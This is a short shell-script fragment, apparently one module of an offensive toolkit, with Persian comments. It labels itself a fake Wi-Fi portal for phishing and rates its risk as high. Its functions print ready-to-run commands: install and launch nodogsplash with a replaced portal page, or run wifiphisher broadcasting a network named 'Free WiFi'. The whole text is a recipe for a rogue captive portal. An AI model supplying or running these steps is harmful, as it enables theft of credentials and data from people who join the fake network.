DESC="پورتال جعلی وای‌فای (فیشینگ)"
RISK="HIGH"

termux(){ echo "# نیاز به گوشی روت و nodogsplash"; }

kali(){
cat <<'EOF'
sudo apt install nodogsplash
sudo nodogsplash -c /etc/nodogsplash/nodogsplash.conf
# صفحه را در /etc/nodogsplash/htdocs/ عوض کن
# یا:
sudo wifiphisher -i wlan0mon -e "Free WiFi"
EOF
}